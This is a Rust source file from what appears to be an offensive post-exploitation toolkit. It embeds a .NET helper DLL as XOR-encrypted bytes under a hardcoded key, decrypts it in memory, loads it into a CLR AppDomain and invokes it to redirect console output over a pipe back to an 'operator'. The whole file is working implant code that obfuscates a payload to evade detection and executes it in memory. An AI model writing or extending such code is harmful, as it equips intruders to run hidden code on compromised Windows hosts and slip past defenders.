//! FlushHelper.exe asset + invoke helper. The XOR'd PE bytes are embedded
//! into the orchestrator at compile time and decrypted on demand. The
//! helper rebinds `Console.Out` / `Console.Error` to a `FileStream` built
//! from a raw pipe handle passed in as a hex string.

use alloc::vec::Vec;
use opsec_com::appdomain::AppDomain;
use opsec_com::comptr::ComPtr;

const FLUSH_KEY: [u8; 16] = [
    0xA9, 0x3F, 0x17, 0xC4, 0xEE, 0x0B, 0x8D, 0x51,
    0x22, 0x6A, 0x7F, 0x04, 0x9C, 0xB3, 0xE7, 0x56,
];
const FLUSH_XOR: &[u8] = include_bytes!("../../../bofs/senjata-execute-assembly/assets/flush.dll.xor");

pub fn decrypt_flush() -> Vec<u8> {
    FLUSH_XOR
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ FLUSH_KEY[i % FLUSH_KEY.len()])
        .collect()
}

/// Load FlushHelper into the given AppDomain and invoke with the pipe
/// handle as a hex-string argument. Logs success/failure via rustbof's
/// eprintln so output reaches the operator.
pub fn do_flush(
    domain: &ComPtr<AppDomain>,
    tag: &str,
    handle_hex: &str,
) {
    let bytes = decrypt_flush();
    match unsafe { crate::netfx::load_assembly(domain, &bytes) } {
        Ok(flush_asm) => {
            match unsafe { crate::netfx::invoke(&flush_asm, handle_hex, 0) } {
                Ok(()) => rustbof::eprintln!("[dbg] flush {} ok", tag),
                Err(e) => rustbof::eprintln!("[dbg] flush {} invoke err: {}", tag, e.format()),
            }
        }
        Err(e) => rustbof::eprintln!("[dbg] flush {} load err: {}", tag, e.format()),
    }
}
